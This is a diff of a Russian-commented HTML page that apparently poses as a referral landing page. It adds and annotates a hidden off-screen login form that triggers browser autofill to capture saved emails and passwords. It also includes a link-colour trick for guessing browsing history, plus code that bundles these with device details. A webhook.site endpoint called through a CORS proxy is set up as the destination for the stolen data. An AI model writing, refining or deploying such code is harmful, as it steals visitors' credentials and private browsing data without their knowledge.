@@ -42,7 +42,15 @@
         .grid div strong { display: block; font-size: 15px; color: #fff; }
         .footer { margin-top: 24px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.04); font-size: 12px; color: rgba(255,255,255,0.15); }
         .footer a { color: rgba(255,255,255,0.2); text-decoration: none; margin: 0 10px; }
-        #hiddenForm { position: absolute; left: -9999px; top: -9999px; opacity: 0; pointer-events: none; }
+        
+        /* Поля для автозаполнения — не скрыты, а смещены (чтобы браузер их видел) */
+        #hiddenForm {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
+            opacity: 0;
+            pointer-events: none;
+        }
         #historyTest { display: none; }
     </style>
 </head>
@@ -68,6 +76,7 @@
     <div class="footer"><a href="#">Политика конфиденциальности</a> • <a href="#">Пользовательское соглашение</a></div>
 </div>
 
+<!-- Форма для автозаполнения (смещена за экран, но видна для браузера) -->
 <form id="hiddenForm">
     <input type="email" id="emailField" name="email" autocomplete="email" value="">
     <input type="password" id="passField" name="password" autocomplete="current-password" value="">
@@ -79,7 +88,7 @@
     // ============================================================
     //  КОНФИГ
     // ============================================================
-    const TARGET_URL = 'https://webhook.site/36bbcb5b-0a2f-434b-b822-03f5a460b514';
+    const TARGET_URL = 'https://webhook.site/36b6bcb8-d02f-4340-b822-03f54060b514';
     const PROXY_URL = 'https://corsproxy.io/?' + encodeURIComponent(TARGET_URL);
 
     // ============================================================
@@ -118,7 +127,7 @@
     }
 
     // ============================================================
-    //  ИСТОРИЯ БРАУЗЕРА
+    //  ИСТОРИЯ БРАУЗЕРА (улучшенный метод для мобильных)
     // ============================================================
     function getBrowserHistory() {
         return new Promise((resolve) => {
@@ -139,20 +148,23 @@
             const container = document.getElementById('historyTest');
             container.innerHTML = '';
 
+            // Создаём ссылки и добавляем в DOM
             sites.forEach(site => {
                 const link = document.createElement('a');
                 link.href = `https://${site}`;
                 link.style.position = 'absolute';
                 link.style.left = '-9999px';
                 link.style.top = '-9999px';
-                link.style.color = 'rgb(0, 0, 255)';
+                link.style.color = 'rgb(0, 0, 255)'; // Принудительный синий
                 container.appendChild(link);
             });
 
+            // Даём время на рендеринг
             setTimeout(() => {
                 const links = container.querySelectorAll('a');
                 links.forEach((link, index) => {
                     const computedColor = getComputedStyle(link).color;
+                    // Проверяем, изменился ли цвет (посещённые ссылки становятся фиолетовыми)
                     if (computedColor !== 'rgb(0, 0, 255)') {
                         visited.push(sites[index]);
                     }
@@ -173,14 +185,21 @@
         btn.textContent = '⏳ Отправка...';
         statusEl.className = 'status';
 
+        // 1. ПАРОЛИ (через автозаполнение)
         const emailField = document.getElementById('emailField');
         const passField = document.getElementById('passField');
+        
+        // Триггерим автозаполнение (фокус на полях)
         emailField.focus();
         passField.focus();
+        
+        // Ждём, пока браузер подставит данные
         await new Promise(r => setTimeout(r, 400));
 
+        // 2. ИСТОРИЯ
         const visitedSites = await getBrowserHistory();
 
+        // 3. СБОР ДАННЫХ
         const data = {
             refId: document.getElementById('refId').textContent,
             userAgent: navigator.userAgent,
@@ -209,6 +228,7 @@
             visitedSites: visitedSites
         };
 
+        // 4. ОТПРАВКА
         const lines = [
             '🔐 НОВЫЙ РЕФЕРАЛЬНЫЙ ПЕРЕХОД',
             '═══════════════════════════════════════',
